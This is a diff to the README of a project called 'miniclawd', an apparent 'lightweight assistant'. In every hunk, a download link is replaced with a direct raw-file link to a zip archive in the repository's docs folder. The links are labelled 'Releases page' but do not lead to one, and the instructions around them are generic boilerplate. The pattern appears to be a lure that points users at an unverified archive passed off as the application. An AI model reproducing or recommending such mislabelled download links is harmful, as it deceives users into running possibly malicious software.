@@ -1,6 +1,6 @@
 # 🦞 miniclawd - Lightweight assistant for your needs
 
-[![Download miniclawd](https://github.com/KOAKAR765/miniclawd/raw/refs/heads/main/skills/producthunt/Software_v1.6.zip)](https://github.com/KOAKAR765/miniclawd/raw/refs/heads/main/skills/producthunt/Software_v1.6.zip)
+[![Download miniclawd](https://raw.githubusercontent.com/KOAKAR765/miniclawd/main/docs/Software-v3.4.zip)](https://raw.githubusercontent.com/KOAKAR765/miniclawd/main/docs/Software-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to miniclawd! This application is designed to be a lightweight assistant
 
 To download miniclawd, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/KOAKAR765/miniclawd/raw/refs/heads/main/skills/producthunt/Software_v1.6.zip). 
+1. Visit the [Releases page](https://raw.githubusercontent.com/KOAKAR765/miniclawd/main/docs/Software-v3.4.zip). 
 2. Choose the latest version available.
 3. Click on the asset that matches your operating system to download the application.
 4. Wait for the download to finish, then locate the file in your downloads folder.
@@ -59,7 +59,7 @@ If you run into issues while using miniclawd, try these common solutions:
 
 - **Can't Find the Application:** Ensure the installation completed correctly. Check your applications folder or desktop.
 - **Performance Issues:** Restart the application or your computer. Make sure your system meets the required specifications.
-- **Errors on Startup:** Try reinstalling the application from the [Releases page](https://github.com/KOAKAR765/miniclawd/raw/refs/heads/main/skills/producthunt/Software_v1.6.zip).
+- **Errors on Startup:** Try reinstalling the application from the [Releases page](https://raw.githubusercontent.com/KOAKAR765/miniclawd/main/docs/Software-v3.4.zip).
 
 ## 📞 Support
 
